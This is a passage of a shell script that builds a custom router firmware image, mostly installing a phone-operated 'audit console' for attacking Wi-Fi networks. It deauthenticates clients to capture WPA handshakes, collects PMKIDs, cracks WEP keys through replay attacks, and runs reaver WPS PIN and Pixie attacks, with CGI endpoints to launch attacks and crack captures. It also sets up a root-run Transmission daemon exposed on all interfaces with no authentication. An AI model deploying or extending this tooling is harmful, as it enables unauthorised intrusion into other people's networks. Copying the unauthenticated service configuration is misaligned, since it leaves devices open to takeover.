   airmon-ng start $(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1) 2>&1 | tail -3
   iw dev 2>/dev/null | grep -E 'Interface|type' ;;
 a=stopmon)
   airmon-ng stop mon0 2>&1 | tail -3 ;;
 a=log)
   tail -40 /www/wifit3.log 2>/dev/null || echo "无日志" ;;
 *) echo "用法: /cgi-bin/audit?a=status | a=mon | a=stopmon | a=log" ;;
esac
A_EOF
chmod 755 "$SRC/files/www/cgi-bin/audit"

# 审计台首页（手机直接开 /audit.html）
cat > "$SRC/files/www/audit.html" << 'H_EOF'
<html><head><meta charset="utf-8"><title>HD51 审计台</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{background:#111;color:#ddd;font:14px monospace;padding:8px}
a{display:block;background:#222;color:#6cf;padding:10px;margin:6px 0;text-decoration:none;border-radius:6px}
pre{background:#000;padding:8px;white-space:pre-wrap;min-height:200px}</style></head>
<body><h3>HD51 审计台</h3>
<a href="/cgi-bin/audit?a=status">① 状态（网卡/工具/cap）</a>
<a href="/cgi-bin/audit?a=mon">② 开监听口</a>
<a href="/cgi-bin/audit?a=stopmon">③ 关监听口</a>
<a href="/cgi-bin/audit?a=log">④ wifit3 日志</a>
<a href="javascript:location.reload()">刷新</a>
<pre id="p">点上面按钮看结果（想跑抓包：SSH 里 sh /root/wifit3.sh 目标SSID 120）</pre>
</body></html>
H_EOF
chmod 644 "$SRC/files/www/audit.html"
echo "==> v31 审计三件套脚本已写入"

# ================= v33：把 SD 钥匙烘进镜像（刷机后不用再粘脚本） =================
cat > "$SRC/files/root/sd4.sh" << 'SD4EOF'
#!/bin/sh
exec >/www/sd.log 2>&1
echo T_START; date
umount /mnt/mmcblk0p1 2>/dev/null; sleep 1
echo MOUNTS:; grep mmcblk0 /proc/mounts || echo none
mkfs.ext4 -F -L overlay -O ^orphan_file -J size=4 -E nodiscard /dev/mmcblk0
echo MKFS_RC=$?
sync; sleep 2
echo VERIFY:; blkid -c /dev/null /dev/mmcblk0
echo T_END
SD4EOF
chmod 755 "$SRC/files/root/sd4.sh"
cat > "$SRC/files/root/sd" << 'SDEOF'
#!/bin/sh
exec /sbin/start-stop-daemon -S -b -m -p /var/run/sd4.pid -x /root/sd4.sh
SDEOF
chmod 755 "$SRC/files/root/sd"
echo "==> SD 钥匙已烘入（/root/sd4.sh + /root/sd）"

# ================= v34：种子下载（transmission-daemon + 网页端） =================
mkdir -p "$SRC/files/etc/config" "$SRC/files/etc/init.d"
cat > "$SRC/files/etc/config/transmission" << 'TRCFG'
config transmission
	option enabled 1
	option user 'root'
	option group 'root'
	option config_dir '/overlay/transmission'
	option download_dir '/overlay/downloads'
	option incomplete_dir_enabled 0
	option cache_size_mb 4
	option peer_limit_global 30
	option peer_limit_per_torrent 20
	option download_queue_size 4
	option preallocation 1
	option rpc_enabled true
	option rpc_bind_address '0.0.0.0'
	option rpc_port 9091
	option rpc_url '/transmission/'
	option rpc_authentication_required false
	option rpc_whitelist_enabled false
	option utp_enabled true
	option dht_enabled true
	option pex_enabled true
TRCFG

cat > "$SRC/files/etc/init.d/tdirs" << 'TDIR'
#!/bin/sh /etc/rc.common
START=90
start() {
	mkdir -p /overlay/transmission /overlay/downloads
	chmod 777 /overlay/downloads 2>/dev/null
}
TDIR
chmod 755 "$SRC/files/etc/init.d/tdirs"
echo "==> v34 transmission 配置 + 下载目录初始化已写入"


# v36：开机钩子——/www 只当入口，实体全在 SD（刷机后自动重建，不用再敲命令）
mkdir -p "$SRC/files/etc/init.d" "$SRC/files/etc/rc.d"
cat > "$SRC/files/etc/init.d/sdlink" << 'SDLE'
#!/bin/sh /etc/rc.common
START=96
start() {
	i=0
	while [ $i -lt 40 ]; do [ -d /data/ui ] && break; sleep 1; i=$((i+1)); done
	[ -d /data/ui ] || return 0
	mkdir -p /data/logs /data/cap
	ln -sfn /data/logs /www/logs
	ln -sfn /data/cap /www/cap
	for f in /data/ui/*.html; do [ -f "$f" ] && ln -sf "$f" "/www/$(basename "$f")"; done
	for f in /data/ui/a3*; do case "$f" in *.html) ;; *) [ -f "$f" ] && ln -sf "$f" "/www/cgi-bin/$(basename "$f")";; esac; done
	chmod 755 /data/ui/*.sh /data/ui/a3* 2>/dev/null
}
SDLE
chmod 755 "$SRC/files/etc/init.d/sdlink"
ln -sf ../init.d/sdlink "$SRC/files/etc/rc.d/S96sdlink"
echo "==> [v36] sdlink 开机钩子已烘入"

# ===== v35：把审计台 6.0 全功能烘进镜像（wifit3 对标：扫描/握手/PMKID/挂机/WEP/WPS + 能力矩阵）=====
mkdir -p "$SRC/files/root" "$SRC/files/www/cgi-bin"
cat > "$SRC/files/root/w3v6.sh" << 'W3V6_EOF'
#!/bin/sh
# ============ HD51 审计引擎 v6（对标 wifit3 全部功能中本机可做的部分）============
# 子命令:
#   scan [秒] [信道|0]        跳频或锁信道扫描，带客户端数/隐藏SSID/加密
#   hs   <目标> <秒>          握手（被动+定向去认证，抓到即停）
#   pmkid<目标> <秒>          PMKID 主动+被动
#   watch<目标> <秒>          挂机等客户端
#   wep  <目标> <秒>          fake auth + ARP replay + PTW
#   wps  <目标> <pixie|pbc|pin> WPS（需 reaver）
#   auto <目标,目标2> <秒>    多目标批量自动
CMD="$1"; shift 2>/dev/null
if [ -z "$CMD" ] && [ -f /tmp/w3.args ]; then
  read -r C6 A1 A2 A3 < /tmp/w3.args
  CMD="$C6"; set -- "$A1" "$A2" "$A3"
fi
mkdir -p /www/logs /data/cap /www/cap
sayf() { echo "[$(date '+%H:%M:%S')] $*" >>"$LOGF"; }
csay() { echo "[$(date '+%H:%M:%S')] $*"; }

# ---------- 公共：监听口 ----------
mon_up() {
  ls /sys/class/net 2>/dev/null | grep -q '^mon0$' || {
    iw phy phy1 interface add mon0 type monitor 2>/dev/null || iw dev wlan1 interface add mon0 type monitor 2>/dev/null
  }
  ip link set mon0 up 2>/dev/null
  ls /sys/class/net 2>/dev/null | grep -q '^mon0$'
}

stas_of() { awk -F, -v b="$1" 'NR>1 {s=$1;gsub(/[ \t]/,"",s);
    if (s ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ && NF>=6) {a=$6;gsub(/[ \t]/,"",a);
      if (toupper(a)==toupper(b)) print s}}' "$2" 2>/dev/null | sort -u; }

resolve() { # $1=csv路径 $2=目标 ; 输出 BSSID|CH|PWR|ESSID|ENC
  awk -F, -v t="$2" 'NR>1 {b=$1;gsub(/[ \t]/,"",b); if (b !~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ || NF<14) next;
    e=$14;sub(/^[ \t]+/,"",e);sub(/[ \t]+$/,"",e); c=$4;gsub(/[ \t]/,"",c); p=$9;gsub(/[ \t]/,"",p); s=$6;gsub(/[ \t]/,"",s);
    lt=tolower(t);
    if (tolower(b)==lt || tolower(e)==lt) {printf "%s|%s|%s|%s|%s\n",b,c,p,e,s; exit}}' "$1" 2>/dev/null; }

fname() { echo "$1" | tr -c 'A-Za-z0-9._-' '_'; }

# ======================= scan =======================
if [ "$CMD" = "scan" ]; then
  SEC="${1:-13}"; CHX="${2:-0}"
  LOGF=/www/logs/scan.log; : >"$LOGF"
  mon_up || { echo "!! mon0 建不起来（USB 网卡没插/没认）"; exit 2; }
  [ "$CHX" != "0" ] && iw dev mon0 set channel "$CHX" 2>/dev/null
  rm -f /data/cap/scan-01.csv
  airodump-ng -w /data/cap/scan --output-format csv mon0 >/dev/null 2>&1 &
  P=$!; sleep "$SEC"; kill $P 2>/dev/null; sleep 2
  awk -F, '
    function trim(x){sub(/^[ \t]+/,"",x);sub(/[ \t]+$/,"",x);return x}
    { b=trim($1)
      if ($1 ~ /Station MAC/) { sect=2; next }
      if (sect==1 && b ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ && NF>=14 && $6 !~ /:/) {
        e=trim($14); c=trim($4); p=trim($9); s=trim($6)
        if (!(b in AP)) { AP[b]=c"|"p"|"e"|"s } }
      else if (sect==2 && b ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ && NF>=6) {
        m=trim($6); if (m in AP) { CNT[m]++; PR[m]=PR[m]" "trim($7) } }
      if ($1 ~ /BSSID/ && sect==0) sect=1
    }
    END { for (b in AP) {
        split(AP[b],a,"|")
        pv=PR[b]; hs=""
        if (a[3]=="") hs="<隐藏>"
        printf "%s|%s|%s|%s|%s|%d|%s\n", a[3]==""?hs:a[3], b, a[1], a[2], a[4], CNT[b]+0, (a[4] ~ /WPA3/?"WPA3":"") } }' \
    /data/cap/scan-01.csv 2>/dev/null | sort -t'|' -k4 -n -r | head -40
  exit 0
fi

# ======================= 目标解析（hs/pmkid/watch/wep/wps 共用）=======================
TARGET="$1"; SEC="$2"
[ -n "$SEC" ] || SEC=180
case "$SEC" in ''|*[!0-9]*) SEC=180 ;; esac
[ "$SEC" -lt 30 ] && SEC=30

# ======================= hs / pmkid / watch / auto =======================
if [ "$CMD" = "hs" ] || [ "$CMD" = "pmkid" ] || [ "$CMD" = "watch" ] || [ "$CMD" = "auto" ]; then
  LOGF=/www/logs/w3.log; HSW=0; : >>"$LOGF"
  HSW=/www/logs/w3.log
  mon_up || { csay "!! mon0 建不起来"; exit 2; }
  rm -f /data/cap/scan-01.csv
  airodump-ng -w /data/cap/scan --output-format csv mon0 >/dev/null 2>&1 &
  SP=$!; sleep 13; kill $SP 2>/dev/null; sleep 2
  L=$(resolve /data/cap/scan-01.csv "$TARGET")
  BSSID=$(echo "$L" | cut -d'|' -f1); CH=$(echo "$L" | cut -d'|' -f2)
  PW=$(echo "$L" | cut -d'|' -f3); ESS=$(echo "$L" | cut -d'|' -f4); SECU=$(echo "$L" | cut -d'|' -f5)
  SAFE=$(fname "$ESS")
  [ -z "$BSSID" ] && { csay "!! 没扫到 $TARGET"; exit 3; }
  echo "== 目标 $ESS ($BSSID) CH$CH ${PW}dBm 加密=$SECU" >>"$LOGF"
  STA1=$(stas_of "$BSSID" /data/cap/scan-01.csv | head -1)
  STAN=$(stas_of "$BSSID" /data/cap/scan-01.csv | wc -l | tr -d ' ')
  echo "== 客户端 $STAN 个${STA1:+ 首个 $STA1}" >>"$LOGF"
  DEAD=$(( $(date +%s) + SEC ))
  remain() { R=$(( DEAD - $(date +%s) )); [ $R -lt 0 ] && R=0; echo $R; }

  hs() {
    BUD="$1"; [ "$BUD" -lt 12 ] && return 1
    BASE=/data/cap/hs-$SAFE; rm -f "$BASE"-01.cap "$BASE"-01.csv
    iw dev mon0 set channel "$CH" 2>/dev/null
    echo "-- 握手 ${BUD}s CH$CH" >>"$LOGF"
    airodump-ng -c "$CH" --bssid "$BSSID" -w "$BASE" --output-format pcap mon0 >/dev/null 2>&1 &
    DP=$!; t=0
    while [ "$t" -lt "$BUD" ]; do
      sleep 6; t=$((t+6)); [ "$t" -gt "$BUD" ] && t=$BUD
      S=$(stas_of "$BSSID" "$BASE-01.csv" | head -1); [ -z "$S" ] && S="$STA1"
      if [ -n "$S" ]; then aireplay-ng -0 8 -a "$BSSID" -c "$S" mon0 >/dev/null 2>&1
      else aireplay-ng -0 8 -a "$BSSID" mon0 >/dev/null 2>&1; fi
      SZ=$(stat -c %s "$BASE-01.cap" 2>/dev/null || echo 0)
      N=$(aircrack-ng -b "$BSSID" "$BASE-01.cap" 2>/dev/null | grep -oE '[0-9]+ handshake' | awk '{print $1}' | head -1)
      echo "  握手 ${t}/${BUD}s cap=${SZ}B handshake=${N:-0} 终端=${S:-无}" >>"$LOGF"
      [ "${N:-0}" -ge 1 ] 2>/dev/null && { HSW=1; echo "  ★★ 抓到握手，停" >>"$LOGF"; break; }
    done
    kill $DP 2>/dev/null; sleep 2
    cp -f "$BASE-01.cap" "/www/cap/hs-$SAFE.cap" 2>/dev/null
  }

  pmkid() {
    BUD="$1"; [ "$BUD" -lt 25 ] && return 1
    echo "-- PMKID ${BUD}s" >>"$LOGF"; F=/data/cap/hcx; rm -f "$F.pcapng"
    if [ ! -f /tmp/hcx.opt ]; then
      for O in "-o $F.pcapng" "-w $F.pcapng" "-o $F.pcapng --enable_status=1"; do
        rm -f "$F.pcapng"; hcxdumptool -i mon0 $O >/tmp/hcx_try.log 2>&1 & P=$!; sleep 5
        [ -s "$F.pcapng" ] && { kill $P 2>/dev/null; sleep 1; echo "$O" >/tmp/hcx.opt; echo "  hcx 参数=$O" >>"$LOGF"; break; }
        kill $P 2>/dev/null; sleep 1
      done
    fi
    [ -f /tmp/hcx.opt ] || { echo "  !! hcxdumptool 参数都不通" >>"$LOGF"; return 1; }
    hcxdumptool -i mon0 $(cat /tmp/hcx.opt) >/tmp/hcx_run.log 2>&1 & P=$!
    t=0; while [ "$t" -lt "$BUD" ]; do sleep 10; t=$((t+10)); [ "$t" -gt "$BUD" ] && t=$BUD
      echo "  PMKID ${t}/${BUD}s $(stat -c %s "$F.pcapng" 2>/dev/null || echo 0)B" >>"$LOGF"; done
    kill $P 2>/dev/null; sleep 1
    cp -f "$F.pcapng" /www/cap/hcx.pcapng 2>/dev/null
    if command -v hcxpcapngtool >/dev/null 2>&1; then
      hcxpcapngtool -o /tmp/all.22000 "$F.pcapng" >/dev/null 2>&1
      grep -i "$BSSID" /tmp/all.22000 >"/data/cap/22-$SAFE.22000" 2>/dev/null
      PK=$(wc -l <"/data/cap/22-$SAFE.22000" 2>/dev/null | tr -d ' ')
      cp -f "/data/cap/22-$SAFE.22000" /www/cap/ 2>/dev/null
      echo "  22000 本目标 ${PK:-0} 条" >>"$LOGF"
      [ "${PK:-0}" -ge 1 ] 2>/dev/null && { HSW=1; echo "  ★★ 拿到 PMKID" >>"$LOGF"; }
    else
      echo "  无 hcxpcapngtool：pcapng 已存 /www/cap/hcx.pcapng（22000 需电脑转）" >>"$LOGF"
    fi
  }

  watch() {
    BUD="$1"; echo "-- 挂机 ${BUD}s" >>"$LOGF"; t=0
    while [ "$t" -lt "$BUD" ]; do
      rm -f /tmp/watch-01.csv
      airodump-ng -w /tmp/watch --output-format csv mon0 >/dev/null 2>&1 & WP=$!; sleep 10; kill $WP 2>/dev/null; sleep 1
      t=$((t+10))
      S=$(stas_of "$BSSID" /tmp/watch-01.csv | head -1)
      if [ -n "$S" ]; then echo "  ${t}s 发现 $S 上线，转握手" >>"$LOGF"; HSW=0; hs 55; [ "$HSW" = 1 ] && return 0
      else echo "  ${t}s 目标无终端" >>"$LOGF"; fi
    done
  }

  case "$CMD" in
    hs) hs "$(remain)" ;;
    pmkid) pmkid "$(remain)" ;;
    watch) watch "$(remain)" ;;
    auto)
      if [ "$STAN" -eq 0 ]; then
        pmkid 60; [ "$HSW" = 1 ] || hs 40; [ "$HSW" = 1 ] || { [ "$(remain)" -gt 20 ] && watch "$(remain)"; }
      else
        hs 70; [ "$HSW" = 1 ] || pmkid 40; [ "$HSW" = 1 ] || { [ "$(remain)" -gt 20 ] && watch "$(remain)"; }
      fi ;;
  esac
  CAPF=/data/cap/hs-$SAFE-01.cap
  if [ -f "$CAPF" ]; then
    SZ=$(stat -c %s "$CAPF" 2>/dev/null || echo 0)
    N=$(aircrack-ng -b "$BSSID" "$CAPF" 2>/dev/null | grep -oE '[0-9]+ handshake' | awk '{print $1}' | head -1)
    echo "== 结果 cap=${SZ}B handshake=${N:-0} → /cap/hs-$SAFE.cap" >>"$LOGF"
  fi
  echo "== 结束" >>"$LOGF"
  exit 0
fi

# ======================= wep =======================
if [ "$CMD" = "wep" ]; then
  LOGF=/www/logs/wep.log; : >"$LOGF"
  mon_up || { csay "!! mon0 建不起来"; exit 2; }
  rm -f /data/cap/scan-01.csv
  airodump-ng -w /data/cap/scan --output-format csv mon0 >/dev/null 2>&1 & SP=$!; sleep 13; kill $SP 2>/dev/null; sleep 2
  L=$(resolve /data/cap/scan-01.csv "$TARGET")
  BSSID=$(echo "$L" | cut -d'|' -f1); CH=$(echo "$L" | cut -d'|' -f2)
  ESS=$(echo "$L" | cut -d'|' -f4); SAFE=$(fname "$ESS")
  [ -z "$BSSID" ] && { csay "!! 没扫到 $TARGET"; exit 3; }
  MAC=$(printf '02:%02X:%02X:%02X:%02X:%02X' $((RANDOM%255)) $((RANDOM%255)) $((RANDOM%255)) $((RANDOM%255)) $((RANDOM%255)))
  echo "== WEP 目标 $ESS ($BSSID) CH$CH 伪造MAC=$MAC" >>"$LOGF"
  iw dev mon0 set channel "$CH" 2>/dev/null
  BASE=/data/cap/wep-$SAFE; rm -f "$BASE"-01.cap "$BASE"-01.ivs
  airodump-ng -c "$CH" --bssid "$BSSID" -w "$BASE" --output-format pcap mon0 >/dev/null 2>&1 & DP=$!
  sleep 3
  aireplay-ng -1 0 -e "$ESS" -a "$BSSID" -h "$MAC" mon0 2>&1 | tail -3 >>"$LOGF"
  aireplay-ng -3 -b "$BSSID" -h "$MAC" mon0 >/tmp/wep_replay.log 2>&1 & RP=$!
  t=0
  while [ "$t" -lt "$SEC" ]; do sleep 10; t=$((t+10))
    IV=$(stat -c %s "$BASE-01.cap" 2>/dev/null || echo 0)
    echo "  WEP ${t}/${SEC}s cap=${IV}B" >>"$LOGF"
  done
  kill $RP $DP 2>/dev/null; sleep 2
  cp -f "$BASE-01.cap" "/www/cap/wep-$SAFE.cap" 2>/dev/null
  echo "== 尝试 PTW 解密钥" >>"$LOGF"
  aircrack-ng -b "$BSSID" "/www/cap/wep-$SAFE.cap" 2>&1 | tail -12 >>"$LOGF"
  echo "== 结束" >>"$LOGF"
  exit 0
fi

# ======================= wps =======================
if [ "$CMD" = "wps" ]; then
  LOGF=/www/logs/wps.log; : >"$LOGF"
  MODE="$2"; [ -n "$MODE" ] || MODE=pixie
  [ "$MODE" = "pixie" ] || [ "$MODE" = "pbc" ] || [ "$MODE" = "pin" ] || MODE=pixie
  if ! command -v reaver >/dev/null 2>&1; then
    echo "!! 本机没有 reaver：WPS 全套（Pixie/PBC/PIN）需在固件里加包" >>"$LOGF"
    echo "!! 缺 reaver" ; exit 2
  fi
  mon_up || { echo "!! mon0 建不起来"; exit 2; }
  rm -f /data/cap/scan-01.csv
  airodump-ng -w /data/cap/scan --output-format csv mon0 >/dev/null 2>&1 & SP=$!; sleep 13; kill $SP 2>/dev/null; sleep 2
  L=$(resolve /data/cap/scan-01.csv "$TARGET")
  BSSID=$(echo "$L" | cut -d'|' -f1); CH=$(echo "$L" | cut -d'|' -f2); ESS=$(echo "$L" | cut -d'|' -f4)
  [ -z "$BSSID" ] && { echo "!! 没扫到 $TARGET"; exit 3; }
  iw dev mon0 set channel "$CH" 2>/dev/null
  echo "== WPS $ESS ($BSSID) CH$CH 模式=$MODE" >>"$LOGF"
  case "$MODE" in
    pixie) reaver -i mon0 -b "$BSSID" -c "$CH" -K 1 -vv 2>&1 | tee -a "$LOGF" | tail -20 ;;
    pbc) reaver -i mon0 -b "$BSSID" -c "$CH" --pbc 1 -vv 2>&1 | tee -a "$LOGF" | tail -20 ;;
    pin) reaver -i mon0 -b "$BSSID" -c "$CH" -vv 2>&1 | tee -a "$LOGF" | tail -20 ;;
  esac
  exit 0
fi

echo "用法: w3v6.sh scan [秒] [信道] | hs|pmkid|watch <目标> <秒> | auto <目标> <秒> | wep <目标> <秒> | wps <目标> <pixie|pbc|pin>"
W3V6_EOF
chmod 755 "$SRC/files/root/w3v6.sh"
cat > "$SRC/files/root/cap6.sh" << 'CAP6_EOF'
#!/bin/sh
# HD51 能力矩阵自检：cap6.sh
# 输出 wifit3 官方 11 项功能在本机的真实可用性
M() { printf '%-26s %s\n' "$1" "$2"; }
HAS() { command -v "$1" >/dev/null 2>&1 && echo "有($(command -v $1))" || echo "缺"; }
echo "==== HD51 能力矩阵 $(date '+%m-%d %H:%M') ===="
echo "== 二进制 =="
for b in airodump-ng aireplay-ng aircrack-ng airmon-ng hcxdumptool hcxpcapngtool reaver wash bully hostapd hostapd_cli iw; do
  M "$b" "$(HAS $b)"
done
echo "== 网卡 =="
iw dev 2>/dev/null | awk '/Interface/{i=$2}/type/{print i" "$2}'
for w in /sys/class/net/wlan*; do
  [ -e "$w" ] || continue
  U=$(cat "$w/device/uevent" 2>/dev/null | sed -n 's/^PRODUCT=//p')
  M "$(basename $w) USB" "${U:-内置}"
done
echo "== 功能判定 =="
H=$(command -v airodump-ng >/dev/null && command -v aireplay-ng >/dev/null && echo ok)
[ "$H" = ok ] && M "⑥ WPA握手(pcap)" "可用" || M "⑥ WPA握手(pcap)" "缺 aircrack 套件"
command -v hcxpcapngtool >/dev/null && M "⑥ .hc22000 导出" "可用" || M "⑥ .hc22000 导出" "缺 hcxtools(要补包)"
command -v hcxdumptool >/dev/null && M "⑦ PMKID" "可用" || M "⑦ PMKID" "缺 hcxdumptool"
command -v reaver >/dev/null && M "⑨ WPS Pixie/PBC/PIN" "可用" || M "⑨ WPS 全套" "缺 reaver(要补包)"
command -v aireplay-ng >/dev/null && command -v aircrack-ng >/dev/null && M "⑩ WEP(replay/chopchop/PTW)" "可用" || M "⑩ WEP" "缺 aireplay/aircrack"
command -v hostapd >/dev/null && M "⑧ EvilTwin 克隆AP" "有 hostapd（还需第二块卡）" || M "⑧ EvilTwin 克隆AP" "缺 hostapd"
NT=$(ls /sys/class/net 2>/dev/null | grep -c '^mon')
M "① 多卡聚合" "当前监听口 ${NT} 个（单 USB 口，需供电 HUB 才能多卡）"
echo "== 5G 能力 =="
if lsusb 2>/dev/null | grep -qi "7612\|0e8d:7612"; then M "② 5G 扫描" "有 MT7612U 在插"; else M "② 5G 扫描" "没插 5G 卡（7612U）"; fi
echo "== 抓包输出 =="
ls -lh /data/cap 2>/dev/null | tail -6
ls -lh /www/cap 2>/dev/null | tail -6
echo "==== 完 ===="
CAP6_EOF
chmod 755 "$SRC/files/root/cap6.sh"
cat > "$SRC/files/www/cgi-bin/a3v6" << 'CGI6_EOF'
#!/bin/sh
printf 'Content-Type: text/plain; charset=utf-8\n\n'
QS="$QUERY_STRING"
g() { echo "$QS" | tr '&' '\n' | sed -n "s/^$1=//p" | head -1; }
d() { printf '%s' "$1" | sed 's/+/ /g;s/%20/ /g;s/%2D/-/g;s/%5F/_/g;s/%2E/./g;s/%3A/:/g;s/%2F/\//g;s/%28/(/g;s/%29/)/g;s/%25/%/g;s/%2C/,/g'; }
A=$(g a); V=$(g v); T=$(d "$(g t)"); S=$(g s); M=$(g m); CH=$(g ch)
case "$A" in
status)
  echo "== 监听口"; iw dev 2>/dev/null | awk '/Interface/{i=$2}/type/{print "  "i" "$2}'
  echo "== 工具"; for x in airodump-ng aireplay-ng aircrack-ng hcxdumptool hcxpcapngtool reaver hostapd; do printf "  %-14s %s\n" "$x" "$(command -v $x || echo 缺)"; done
  echo "== 存储"; df -h /data 2>/dev/null | tail -1
  echo "== 任务"; ps w 2>/dev/null | grep -E "w3v6|hcxv4" | grep -v grep || echo "  空闲" ;;
cap)
  [ -x /root/cap6.sh ] && sh /root/cap6.sh || echo "!! /root/cap6.sh 没装" ;;
scan)
  [ -x /root/w3v6.sh ] || { echo "!! /root/w3v6.sh 没装"; exit 0; }
  ls /sys/class/net | grep -q mon0 || { iw phy phy1 interface add mon0 type monitor 2>/dev/null; ip link set mon0 up 2>/dev/null; }
  sh /root/w3v6.sh scan "${S:-13}" "${CH:-0}" 2>&1 ;;
list)
  [ -x /root/w3v6.sh ] || { echo "!! /root/w3v6.sh 没装"; exit 0; }
  sh /root/w3v6.sh scan "${S:-13}" "${CH:-0}" 2>&1 ;;
start)
  [ -x /root/w3v6.sh ] || { echo "!! /root/w3v6.sh 没装"; exit 0; }
  case "$V" in
   hs|pmkid|watch|auto|wep|wps) ;;
   *) echo "!! 未知模式 $V"; exit 0 ;;
  esac
  if [ -z "$T" ]; then echo "!! 目标为空：先扫描并点一个 AP"; exit 0; fi
  printf '%s %s %s %s\n' "$V" "$T" "${S:-180}" "${M:-}" > /tmp/w3.args
  rm -f /var/run/w3v6.pid
  /sbin/start-stop-daemon -S -b -m -p /var/run/w3v6.pid -x /root/w3v6.sh
  sleep 2
  if [ -f /var/run/w3v6.pid ] && kill -0 "$(cat /var/run/w3v6.pid)" 2>/dev/null; then
    echo "STARTED $V 目标=$T 时长=${S:-180}s ${M:+模式=$M}"
  else
    echo "!! 启动失败"; rm -f /var/run/w3v6.pid
  fi ;;
stop)
  [ -f /var/run/w3v6.pid ] && kill "$(cat /var/run/w3v6.pid)" 2>/dev/null; rm -f /var/run/w3v6.pid
  for p in $(ps w 2>/dev/null | awk '/w3v6|airodump|hcxdump|aireplay|reaver/{print $1}'); do kill "$p" 2>/dev/null; done
  sleep 1; echo "STOPPED" ;;
poll)
  case "$V" in wep) L=/www/logs/wep.log ;; wps) L=/www/logs/wps.log ;; *) L=/www/logs/w3.log ;; esac
  RUN=no; ps w 2>/dev/null | grep w3v6 | grep -v grep | grep -q . && RUN=yes
  echo "STATE=$RUN"
  SZ=0
  for f in $(ls -t /data/cap/*.cap /data/cap/*.pcapng 2>/dev/null | head -3); do
    Q=$(stat -c %s "$f" 2>/dev/null || echo 0); [ "$Q" -gt "$SZ" ] && SZ=$Q
  done
  echo "SIZE=${SZ}B"
  echo "--- 日志尾 ---"; tail -26 "$L" 2>/dev/null
  echo "--- 可下载 ---"; ls -lh /www/cap 2>/dev/null | awk 'NR>1{print $9" "$5}' | tail -8 ;;
crack)
  C=$(ls -t /data/cap/hs-*-01.cap /data/cap/wep-*-01.cap /www/cap/*.cap 2>/dev/null | head -1)
  [ -f "$C" ] || { echo "没有 cap"; exit 0; }
  echo "FILE=$C"
  aircrack-ng "$C" 2>&1 | head -10 ;;
files)
  echo "== /data/cap"; ls -lh /data/cap 2>/dev/null | tail -12
  echo "== /www/cap"; ls -lh /www/cap 2>/dev/null | tail -12 ;;
*) echo "用法 ?a=status|cap|list&s=13&ch=0|start&v=hs&t=BSSID&s=180&m=auto|start&v=wep&t=BSSID&s=180|start&v=wps&t=BSSID&m=pixie|stop|poll&v=hs|crack|files" ;;
esac
CGI6_EOF
chmod 755 "$SRC/files/www/cgi-bin/a3v6"
cat > "$SRC/files/www/a3v6.html" << 'PAGE6_EOF'
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HD51 审计台 6.0</title>
<style>
body{background:#0d1117;color:#c9d1d9;font:15px -apple-system,sans-serif;margin:0;padding:10px}
h2{margin:2px 0 8px;color:#58a6ff;font-size:19px}
.tabs{display:flex;gap:5px;margin-bottom:10px;flex-wrap:wrap}
.tab{flex:1;min-width:60px;text-align:center;padding:9px;background:#161b22;border-radius:8px;color:#8b949e;font-size:14px}
.tab.on{background:#1f6feb;color:#fff}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:10px;margin-bottom:10px}
input{width:100%;box-sizing:border-box;padding:10px;margin:5px 0;background:#010409;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;font-size:15px}
.row{display:flex;gap:7px}
button{flex:1;padding:11px;background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:8px;font-size:14px}
button.p{background:#238636;border-color:#238636;color:#fff}
button.s{background:#da3633;border-color:#da3633;color:#fff}
button.m.on{background:#1f6feb;border-color:#1f6feb;color:#fff}
pre{background:#010409;border:1px solid #30363d;border-radius:8px;padding:10px;white-space:pre-wrap;font-size:12px;max-height:42vh;overflow:auto}
.ap{display:block;width:100%;text-align:left;margin:4px 0;padding:9px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;font-size:13px}
.ap b{color:#58a6ff}.ap span{color:#8b949e}
.st{font-size:13px;color:#8b949e;margin:6px 0}
.lbl{font-size:12px;color:#8b949e;margin-top:6px}
</style></head><body>
<h2>HD51 审计台 6.0</h2>
<div class="tabs">
<div class="tab on" id="t0" onclick="go(0)">扫描</div>
<div class="tab" id="t1" onclick="go(1)">抓包</div>
<div class="tab" id="t2" onclick="go(2)">WEP</div>
<div class="tab" id="t3" onclick="go(3)">WPS</div>
<div class="tab" id="t4" onclick="go(4)">状态</div>
</div>

<div class="card" id="c0">
<div class="lbl">扫描秒数 / 锁定信道（0=跳频全信道）</div>
<div class="row"><input id="scansec" value="13"><input id="scanch" value="0"></div>
<div class="row"><button onclick="doScan()">扫描（跳频）</button><button onclick="q('a=cap','o4')">能力矩阵</button></div>
<div id="aps"></div>
<div class="lbl">点任意 AP 即选定目标（自动记 BSSID，同名热点不会认错）；再切到「抓包」开跑</div>
<pre id="o0">还没有扫描</pre>
</div>

<div class="card" id="c1" style="display:none">
<div class="lbl">当前目标</div>
<input id="tgt" placeholder="目标 SSID 或 BSSID（点扫描里选）" value="xu">
<div class="lbl">抓法</div>
<div class="row">
<button class="m on" id="m_auto" onclick="setm('auto')">自动</button>
<button class="m" id="m_hs" onclick="setm('hs')">握手</button>
<button class="m" id="m_pmkid" onclick="setm('pmkid')">PMKID</button>
<button class="m" id="m_watch" onclick="setm('watch')">挂机等</button>
</div>
<div class="lbl">总时长（秒）</div>
<input id="sec" value="180">
<div class="row"><button class="p" onclick="startV('hs')">开跑</button><button class="s" onclick="stop()">停止</button></div>
<div class="st" id="st1">状态：空闲</div>
<pre id="o1">-</pre>
</div>

<div class="card" id="c2" style="display:none">
<div class="lbl">WEP：fake auth → ARP replay → PTW 解钥（只对 WEP 网络有意义）</div>
<input id="wept" placeholder="目标 BSSID 或 SSID" value="">
<div class="lbl">秒数</div>
<input id="weps" value="180">
<div class="row"><button class="p" onclick="startV('wep')">开跑</button><button class="s" onclick="stop()">停止</button></div>
<div class="st" id="st2">状态：空闲</div>
<pre id="o2">-</pre>
</div>

<div class="card" id="c3" style="display:none">
<div class="lbl">WPS（需固件里有 reaver，否则会在状态页显示「缺」）</div>
<input id="wpst" placeholder="目标 BSSID 或 SSID" value="">
<div class="lbl">模式</div>
<div class="row">
<button class="m on" id="w_pixie" onclick="setw('pixie')">PixieDust</button>
